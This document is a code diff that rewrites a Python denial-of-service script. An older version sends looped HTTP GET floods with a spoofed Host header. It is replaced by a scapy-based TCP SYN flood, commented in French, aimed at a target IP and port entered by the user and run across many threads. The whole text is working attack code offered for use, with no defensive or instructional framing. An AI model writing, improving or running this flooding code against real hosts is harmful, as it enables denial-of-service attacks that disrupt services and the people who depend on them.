@@ -1,37 +1,36 @@
 import socket
 import threading
-import os
-import ipaddress
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from queue import Queue
+from scapy.all import *
 
+# Paramètres de la cible
 target = str(input("Insert target’s IP: "))
 port = int(input("Insert Port: "))
 Trd = int(input("Insert number of Threads: "))
-fake_ip = '44.192.193.194'
 
-try:
-    target_ip = ipaddress.ip_address(target)
-except ValueError:
-    print("Invalid IP address!")
-    exit()
+# Queue pour les exceptions
+exception_queue = Queue()
 
-if not (0 < port < 65536):
-    print("Invalid port number!")
-    exit()
+def syn_attack():
+    try:
+        # Création d'un paquet SYN avec scapy
+        packet = IP(dst=target)/TCP(dport=port, flags="S")
+        send(packet, verbose=False)  # Envoi du paquet en mode silencieux
+    except Exception as e:
+        exception_queue.put(e)
 
-def attack():
- while True:
- s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- s.connect((target, port))
- s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode(’ascii’), (target, port))
- s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode(’ascii’), (target, port))
- s.close()
+# Création des threads et lancement de l'attaque
+with ThreadPoolExecutor(max_workers=Trd) as executor:
+    future_to_thread = {executor.submit(syn_attack): i for i in range(Trd)}
+    
+    for future in as_completed(future_to_thread):
+        thread_id = future_to_thread[future]
+        try:
+            future.result()
+        except Exception as e:
+            print(f"Thread {thread_id} raised an exception: {e}")
 
-  for i in range(Trd):
- thread = threading.Thread(target=attack)
- thread.start()
-
-global attack_num
- attack_num += 1
- print(attack_num)
-
-
+# Vérification des exceptions après la fin de l'attaque
+while not exception_queue.empty():
+    print(f"Caught exception: {exception_queue.get()}")
